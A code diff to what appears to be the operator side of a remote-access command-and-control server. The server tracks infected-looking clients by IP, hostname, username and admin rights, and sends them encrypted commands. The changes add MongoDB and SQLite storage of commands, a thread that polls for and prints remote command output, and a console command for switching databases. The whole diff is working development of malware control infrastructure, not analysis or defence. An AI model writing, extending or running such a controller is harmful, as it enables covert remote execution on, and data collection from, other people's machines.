@@ -75,6 +75,17 @@ class CryptoManager:
         return json.loads(self.fernet.decrypt(data).decode())
 
 class DatabaseManager:
+    @staticmethod
+    def _safe_mongo_uri(uri):
+        """URL-encode username and password in a MongoDB URI (RFC 3986 compliance)."""
+        import re
+        from urllib.parse import quote_plus
+        m = re.match(r'^(mongodb(?:\+srv)?://)([^:@]+):([^@]+)@(.+)$', uri)
+        if m:
+            scheme, user, password, rest = m.groups()
+            return f"{scheme}{quote_plus(user)}:{quote_plus(password)}@{rest}"
+        return uri
+
     def __init__(self, db_path: str, mongodb_uri: str = None):
         self.db_path = db_path
         self.mongodb_uri = mongodb_uri or os.environ.get('MONGODB_URI')
@@ -84,7 +95,8 @@ class DatabaseManager:
             try:
                 from pymongo import MongoClient
                 from pymongo.server_api import ServerApi
-                self.client = MongoClient(self.mongodb_uri, server_api=ServerApi('1'))
+                safe_uri = self._safe_mongo_uri(self.mongodb_uri)
+                self.client = MongoClient(safe_uri, server_api=ServerApi('1'))
                 self.db = self.client.get_database('c2_database')  # Same DB as GUI
                 print(Fore.GREEN + "[*] Connected to MongoDB Atlas" + Style.RESET_ALL)
                 self._init_mongo()
@@ -96,8 +108,34 @@ class DatabaseManager:
             os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
             self._init_sqlite()
 
+    def switch_mode(self, use_mongo: bool):
+        if use_mongo:
+            if not self.mongodb_uri:
+                self.mongodb_uri = os.environ.get('MONGODB_URI')
+            if not self.mongodb_uri:
+                raise RuntimeError("No MONGODB_URI configured. Set it in your .env file or pass it at startup.")
+            from pymongo import MongoClient
+            from pymongo.server_api import ServerApi
+            safe_uri = self._safe_mongo_uri(self.mongodb_uri)
+            self.client = MongoClient(safe_uri, server_api=ServerApi('1'))
+            self.db = self.client.get_database('c2_database')
+            self.use_mongo = True
+            self._init_mongo()
+        else:
+            self.use_mongo = False
+            self._init_sqlite()
+
+
     def _init_sqlite(self):
-        c = self._conn_sqlite()
+        # Single persistent connection + lock for thread-safety (fixes 'database is locked')
+        import threading
+        if not hasattr(self, '_sqlite_lock'):
+            self._sqlite_lock = threading.Lock()
+        self._sqlite_conn = sqlite3.connect(self.db_path, check_same_thread=False)
+        self._sqlite_conn.execute('PRAGMA journal_mode=WAL')
+        self._sqlite_conn.execute('PRAGMA busy_timeout=5000')  # wait up to 5s on lock
+        self._sqlite_conn.row_factory = sqlite3.Row
+        c = self._sqlite_conn
         c.execute('CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, ip_address TEXT, hostname TEXT, os TEXT, username TEXT, status TEXT DEFAULT \'offline\', last_seen TEXT, is_admin BOOLEAN DEFAULT 0, gpu TEXT, motherboard TEXT)')
         c.execute('''
             CREATE TABLE IF NOT EXISTS commands (
@@ -161,18 +199,19 @@ class DatabaseManager:
         self.db.commands.update_many({"is_active": 1}, {"$set": {"is_active": 0}})
 
     def _conn_sqlite(self):
-        conn = sqlite3.connect(self.db_path, check_same_thread=False)
-        conn.execute('PRAGMA journal_mode=WAL')
-        conn.row_factory = sqlite3.Row
-        return conn
+        """Return the shared persistent SQLite connection (use _sqlite_lock for writes)."""
+        if not hasattr(self, '_sqlite_conn') or self._sqlite_conn is None:
+            self._init_sqlite()
+        return self._sqlite_conn
 
     def execute(self, q, p=()):
         if not self.use_mongo:
-            conn = self._conn_sqlite()
-            res = conn.execute(q, p)
-            conn.commit()
-            return res
-        return None # Not used for Mongo logic directly
+            with self._sqlite_lock:
+                conn = self._conn_sqlite()
+                res = conn.execute(q, p)
+                conn.commit()
+                return res
+        return None  # Not used for Mongo logic directly
 
     def get_pending_commands(self):
         if self.use_mongo:
@@ -271,6 +310,7 @@ class AdvancedC2Server:
         self.client_lock = threading.Lock()
         self.running = False
         self.selected_client = None
+        self._printed_command_ids = set()
         
         self.logger = Logger(config.log_file, config.debug)
         self.db = DatabaseManager(config.database)
@@ -320,6 +360,7 @@ class AdvancedC2Server:
         threading.Thread(target=self._command_loop, daemon=True).start()
         threading.Thread(target=self._discovery_responder, daemon=True).start()
         threading.Thread(target=self._audio_playback_loop, daemon=True).start()
+        threading.Thread(target=self._poll_mongodb_results, daemon=True).start()
         
         server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -1040,14 +1081,91 @@ class AdvancedC2Server:
         self.send_command(cids, 'sync_tasks')
 
     def send_command(self, targets, c_type, params=None, cmd_id=None):
-        if not cmd_id: cmd_id = os.urandom(4).hex()
+        ts = datetime.datetime.now().isoformat()
         for cid in targets:
+            # Each target gets its own unique cmd_id to avoid UNIQUE constraint failures
+            per_target_id = cmd_id if (cmd_id and len(targets) == 1) else os.urandom(4).hex()
+            # Register the command in the database (either MongoDB or SQLite)
+            if self.db.use_mongo:
+                try:
+                    self.db.db.commands.insert_one({
+                        "id": per_target_id,
+                        "client_id": cid,
+                        "command_type": "command",
+                        "command_name": c_type,
+                        "parameters": json.dumps(params or {}),
+                        "status": "pending",
+                        "result": None,
+                        "error_message": None,
+                        "execution_time": None,
+                        "created_at": ts,
+                        "updated_at": ts,
+                        "is_active": 0
+                    })
+                except Exception as e:
+                    self.logger.error(f"Failed to insert command into Mongo: {e}")
+            else:
+                try:
+                    with self.db._sqlite_lock:
+                        c = self.db._conn_sqlite()
+                        c.execute("INSERT OR IGNORE INTO commands (id, client_id, command_type, command_name, parameters, status, created_at, updated_at, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)",
+                                  (per_target_id, cid, "command", c_type, json.dumps(params or {}), "pending", ts, ts))
+                        c.commit()
+                except Exception as e:
+                    self.logger.error(f"Failed to insert command into SQLite: {e}")
+            
             client = self.clients.get(cid)
-            if not client: continue
+            if not client:
+                continue
             try:
-                payload = {'id': cmd_id, 'type': c_type, 'params': params or {}}
+                payload = {'id': per_target_id, 'type': c_type, 'params': params or {}}
                 self._send_raw(client['sock'], self.crypto.encrypt_json(payload))
-            except: pass
+                # Mark as executing since it was sent via socket
+                self.db.update_command_status(per_target_id, 'executing', is_active=1)
+            except Exception as e:
+                self.logger.error(f"Error sending command over socket: {e}")
+
+    def _poll_mongodb_results(self):
+        """Poll MongoDB for completed/failed command results to display to the console operator"""
+        while self.running:
+            try:
+                if self.db.use_mongo and hasattr(self.db, 'db'):
+                    completed_cmds = list(self.db.db.commands.find({
+                        "status": {"$in": ["completed", "failed"]},
+                        "id": {"$nin": list(self._printed_command_ids)}
+                    }))
+                    
+                    for cmd in completed_cmds:
+                        cmd_id = cmd.get('id')
+                        cid = cmd.get('client_id')
+                        status = cmd.get('status')
+                        result_data = cmd.get('result')
+                        error_msg = cmd.get('error_message')
+                        
+                        self._printed_command_ids.add(cmd_id)
+                        if len(self._printed_command_ids) > 10000:
+                            self._printed_command_ids.clear()
+                            
+                        if result_data:
+                            try: data = json.loads(result_data)
+                            except: data = result_data
+                        else:
+                            data = error_msg or "No result or error message returned."
+                            
+                        print(f"{Fore.CYAN}\n[MONGO-RESULT][{cid}] [{cmd_id}]")
+                        if isinstance(data, dict):
+                            if 'stdout' in data or 'stderr' in data:
+                                if data.get('stdout'): print(f"{Fore.WHITE}{data['stdout']}")
+                                if data.get('stderr'): print(f"{Fore.RED}ERROR: {data['stderr']}")
+                                print(f"{Fore.YELLOW}[RC: {data.get('returncode', 0)}] [CWD: {data.get('cwd', '?')}]")
+                            else:
+                                print(f"{Fore.WHITE}{json.dumps(data, indent=2)}")
+                        else:
+                            print(f"{Fore.WHITE}{data}")
+                        print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}\n")
+            except Exception as e:
+                pass
+            time.sleep(2)
 
     def _command_loop(self):
         while self.running:
@@ -1097,6 +1215,26 @@ class CommandParser:
             elif cmd == 'deselect': self.server.selected_client = None
             elif cmd == 'clear': os.system('cls' if os.name == 'nt' else 'clear')
             elif cmd == 'help': self._show_help()
+            elif cmd == 'dbmode':
+                if args:
+                    mode = args[0].lower()
+                    if mode in ('mongo', 'mongodb'):
+                        try:
+                            self.server.db.switch_mode(True)
+                            self.server.logger.success("Switched database mode to MongoDB Atlas")
+                        except Exception as e:
+                            self.server.logger.error(f"Failed to switch to MongoDB: {e}")
+                    elif mode in ('sqlite', 'normal', 'sqlite3'):
+                        try:
+                            self.server.db.switch_mode(False)
+                            self.server.logger.success("Switched database mode to SQLite (Normal)")
+                        except Exception as e:
+                            self.server.logger.error(f"Failed to switch to SQLite: {e}")
+                    else:
+                        print("Invalid mode. Use 'dbmode mongo' or 'dbmode normal'")
+                else:
+                    current_mode = "MongoDB" if self.server.db.use_mongo else "SQLite (Normal)"
+                    print(f"Current database mode: {current_mode}")
             elif cmd == 'exit': os._exit(0)
             
             # --- Remote Execution ---
@@ -1354,6 +1492,7 @@ class CommandParser:
   {G}deselect{W}             Go back to broadcast mode (all clients)
   {G}clear{W}                Clear the terminal screen
   {G}exit{W}                 Shut down the C2 server entirely
+  {G}dbmode <mongo|normal>{W} Switch database dynamically (MongoDB Atlas vs SQLite)
 
 {Y}╔══════════════════════════════════════╗
 ║        EXECUTION                     ║
